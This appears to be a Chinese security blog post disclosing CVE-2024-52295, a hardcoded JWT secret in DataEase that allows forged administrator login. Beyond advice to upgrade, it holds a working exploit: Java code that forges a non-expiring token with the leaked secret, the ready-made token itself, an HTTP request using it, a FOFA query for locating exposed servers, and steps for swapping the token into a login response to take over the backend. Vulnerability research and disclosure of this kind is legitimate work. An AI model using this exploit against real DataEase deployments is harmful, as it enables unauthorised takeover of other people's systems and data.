#  DataEase 严重级别任意登录漏洞 POC 已公开   
原创 一个不正经的黑客  一个不正经的黑客   2025-01-05 02:04  
  
# DataEase 严重级别任意登录漏洞 POC 已公开  
## 1.DataEase 简介   
  
DataEase 是一个开源的数据可视化分析工具  
  
项目地址：https://github.com/dataease/dataease  
  
目前 Github 平台已经高达 18.7K Star , 互联网也存在诸多应用，请及时自查升级最新版本。  
## 2.漏洞描述   
  
DataEase 是一个开源的数据可视化分析工具。用于帮助用户快速分析数据并洞察业务趋势，从而实现业务的改进与优化。  
  
DataEase <= 2.10.1 之前版本存在安全漏洞，但最新版 2.10.3 已经修复此漏洞，请及时升级。  
  
CVE 编号： CVE-2024-52295  
  
漏洞级别：严重  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3baK5Kz6O5SQvVLHNPY3u58Q9cdTwQ1BOolcMz05EO7GUZOm2xOsCyemTLoibDgLvWfp1WRQbz5QeA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 3.FOFA 查询语句   
  
body="Dataease"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMrSzBMiaqZsqK1444PxWznRS61iaaDDL2l5KmuevMiceOoiazsO8sJHhTXVgGDLyAm5USjC1SVUmhcwGg/640?wx_fmt=png&from=appmsg "")  
## 4.漏洞分析   
  
**代码分析：**  
  
io.dataease.substitute.permissions.login.SubstituleLoginServer  
```
public class SubstituleLoginServer {    @PostMapping("/login/localLogin")    public TokenVO localLogin(PwdLoginDTO dto) {        TokenUserBO tokenUserBO = new TokenUserBO();        tokenUserBO.setUserId(1L);        tokenUserBO.setDefaultOid(1L);        String md5Pwd = "83d923c9f1d8fcaa46cae0ed2aaa81b5";        return generate(tokenUserBO, md5Pwd);    }    @GetMapping("/logout")    public void logout() {        LogUtil.info("substitule logout");    }    private TokenVO generate(TokenUserBO bo, String secret) {        Algorithm algorithm = Algorithm.HMAC256(secret);        Long userId = bo.getUserId();        Long defaultOid = bo.getDefaultOid();        JWTCreator.Builder builder = JWT.create();        builder.withClaim("uid", userId).withClaim("oid", defaultOid);        String token = builder.sign(algorithm);        returnnew TokenVO(token, 0L);    }}
```  
  
在这段代码中，JWT 密钥被硬编码在代码中，UID 和 OID 也被硬编码。这意味着攻击者可以伪造 JWT 并接管服务。  
  
**漏洞证明概述 (POC)：**  
```
package io.dataease;import com.auth0.jwt.JWT;import com.auth0.jwt.JWTCreator;import com.auth0.jwt.algorithms.Algorithm;import io.dataease.api.permissions.login.api.LoginApi;import io.dataease.auth.vo.TokenVO;public class jwt {    public static void main(String[] args) {        // 设置密钥        String secret = "83d923c9f1d8fcaa46cae0ed2aaa81b5";        Algorithm algorithm = Algorithm.HMAC256(secret);        // 设置用户ID和默认OID        Long userId = 1L;        Long defaultOid = 1L;        // 创建 JWT 构建器并添加声明        JWTCreator.Builder builder = JWT.create();        // 修改过时时间为无限长        builder.withClaim("uid", 1).withClaim("oid", 1).withClaim("exp", 99999999999L);        // 生成 JWT        String token = builder.sign(algorithm);        // 输出生成的 JWT        System.out.println("X-DE-TOKEN: " + token);    }}
```  
## 5.漏洞复现   
  
使用上面代码生成的  
X-DE-TOKEN  
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.okytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cY
```  
  
合法token后，可以通过指定：X-De-Token 从而实现在未授权状态下访问所有端点。  
```
GET /de2api/engine/getEngine HTTP/1.1Host: localhostX-De-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5OTk5OTk5OTk5OX0.okytUClKBAHbww_C3ZZTINTUtbQSSE9ILJwhbIBr_cYAccept-Encoding: gzip, deflate, brConnection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMrSzBMiaqZsqK1444PxWznRSzdUktEljgnxMoAGdY3Ot6Khk1aAQrbuyMnMv2T3f3pE00cMpIGTiaDw/640?wx_fmt=png&from=appmsg "")  
  
如果在登录页面，输入错误账号密码，修改响应包的返回为此 Token，可以实现接管后台，任意调用功能，利用各种反序列化和后台功能可以实现 RCE，危害严重，请及时修复！  
  
如：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMrSzBMiaqZsqK1444PxWznRSUqm0w82Ou8a6MHG7Skud5gEPCEHecNNO24dsVFywicB2eRVkNnHcxAw/640?wx_fmt=png&from=appmsg "")  
  
修改返回值为上面那个不会过时的 Token，之后便可以登录到系统了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMrSzBMiaqZsqK1444PxWznRSAl0wLLeFcpQibO3Xsibeic3Yt05wRMJRdEZXSHp2tTOKuuaDrBEUAKk7w/640?wx_fmt=png&from=appmsg "")  
## 6.文末寄语   
  
JWT 固定密钥漏洞是一个较为常见的问题，流行发生在 Golang 和 java 的项目中，大家在进行漏洞挖掘的时候可以额外注意！  
  
此外，本次漏洞点发生在登录功能很明显的特征点上，只要细心一点，我相信一个过万 Star 项目的 0day 离你不远！  
  
关注+一个不正经的黑客公众号，洞察业界动态，揽安全美人入怀，杯酒觥筹间，让知识掉入大脑陷阱，把0day 装进你的口袋，也许距离走上人生巅峰，你也就差的只是一个小关小注，交个朋友，干杯！  
  
